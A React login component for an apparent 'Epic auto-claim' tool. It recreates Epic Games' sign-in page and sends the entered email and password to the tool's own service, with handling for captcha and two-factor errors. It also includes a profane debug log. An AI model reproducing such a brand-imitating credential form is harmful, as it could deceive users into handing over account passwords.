import React, { useState } from 'react';
import Logo from '../../images/epic-auto-claim.png';
import { connect } from 'react-redux';
import { loginService } from '../../utils/services';
import { userDispatch } from '../../redux/login/actions';
import { loginSchema } from './appSchema';
import { history } from '../../helpers';
import { useForm } from 'react-hook-form';
import { yupResolver } from '@hookform/resolvers';

import './app.css';

const App = (props) => {
    const [isLoading, setLoading] = useState(false);
    const { handleSubmit, register, errors, getValues } = useForm({
        resolver: yupResolver(loginSchema),
        mode: "all"
    });

    const onSubmit = ({ email, password }) => {
        setLoading(true);
        loginService.login(email, password)
            .then(({ statusText }) => { 
                setLoading(false);
                props.userDispatch(email);
                history.push("/profile", { email });
                // if(statusText === "OK") {
                // }
            })
            .catch((e) => {
                setLoading(false);
                if (e.response && e.response.data && e.response.data.errorCode) {
                    // wrong password
                    //  "errorCode": "errors.com.epicgames.common.two_factor_authentication.required", metadata: { twoFactorMethod: 'sms', alternateMethods: [ 'sms', 'email' ] }
                    //  "errorCode": "errors.com.epicgames.account.invalid_account_credentials"
                    if (e.response.data.errorCode.includes('session_invalidated')) {
                        
                    } else if (
                        e.response.data.errorCode === 'errors.com.epicgames.accountportal.captcha_invalid'
                    ) {
                        history.push("/captcha", { email, password });
                    } else if (
                        e.response.data.errorCode === 'errors.com.epicgames.common.two_factor_authentication.required'
                    ) {
                        console.log('TWO FACTOR YOU FUCKER.');
                        const method = e.response.data.metadata.twoFactorMethod;
                        history.push("/twofactor", { email, password, method });
                    }
                }
            });
    }
    const isRequired = (name) => {
        if (errors?.[name]?.type === "required") {
            return "MuiInputBase-root MuiInput-root MuiInputBase-adornedEnd Mui-error";
        }
        return "MuiInputBase-root MuiInput-root MuiInputBase-adornedEnd";
    };

    const isEnable = () => {
        var values = getValues(["email", "password"]);
        if (values["email"] && values["password"] && !isLoading) {
            return "MuiButtonBase-root MuiButton-root MuiButton-contained SubmitButton MuiButton-containedPrimary MuiButton-fullWidth";
        }
        return "MuiButtonBase-root MuiButton-root MuiButton-contained SubmitButton MuiButton-containedPrimary MuiButton-fullWidth Mui-disabled";
    };

    return (
        <div className="modalbase-container">
            <div className="modalbase-content">
                <div className="modalbase-card">
                    <div className="optional-top-spacer"></div>
                    <div className="modalbase-card-content">
                        <div className="layout-vertical">
                            <div className="epiclogo-layout">
                                <img src={Logo} alt="Logo" className="EpicLogo" style={{ width: 130, height: 50 }} />
                            </div>
                            <h6 className="MuiTypography-root Subheading upper MuiTypography-subtitle1">Sign in with an Epic Games Account</h6>
                            <form className="form-vertical">
                                <div className="MuiFormControl-root form-field MuiFormControl-fullWidth">
                                    <div className={isRequired("email")}>
                                        <input
                                            autoComplete="email"
                                            id="email"
                                            name="email"
                                            placeholder="Email Address"
                                            type="text" inputMode="text"
                                            aria-label="email"
                                            autoCorrect="off"
                                            autoCapitalize="none"
                                            spellCheck="false"
                                            className="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedEnd"
                                            aria-invalid="true"
                                            ref={register}
                                        />
                                        {
                                            errors?.email?.type === "required" ?
                                                <div className="MuiInputAdornment-root upper validation-adornment MuiInputAdornment-filled MuiInputAdornment-positionEnd">
                                                    Required
                                                </div> : null
                                        }
                                    </div>
                                </div>
                                <div className="MuiFormControl-root form-field MuiFormControl-fullWidth">
                                    <div className={isRequired("password")}>
                                        <input
                                            autoComplete="current-password"
                                            id="password"
                                            name="password"
                                            placeholder="Password"
                                            type="password" inputMode="text"
                                            aria-label="password"
                                            className="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedEnd"
                                            ref={register}
                                        />
                                        {
                                            errors?.password?.type === "required" ?
                                                <div className="MuiInputAdornment-root upper validation-adornment MuiInputAdornment-filled MuiInputAdornment-positionEnd">
                                                    Required
                                                </div> : null
                                        }
                                    </div>
                                </div>

                                <div className="controls-vertical">
                                    <button
                                        className={isEnable()}
                                        type="submit"
                                        aria-label="sign-in"
                                        onClick={handleSubmit(onSubmit)}
                                    >
                                        { !isLoading ? <span className="MuiButton-label">Log in now</span>: null }
                                        { isLoading ? <i style={{ fontSize: 20 }} className="fa fa-circle-o-notch fa-spin"></i> : null }
                                    </button>
                                </div>
                            </form>
                        </div>
                    </div>
                    <div className="optional-bottom-spacer"></div>
                </div>
            </div>
        </div>
    );
}

export default connect(null,{userDispatch})(App);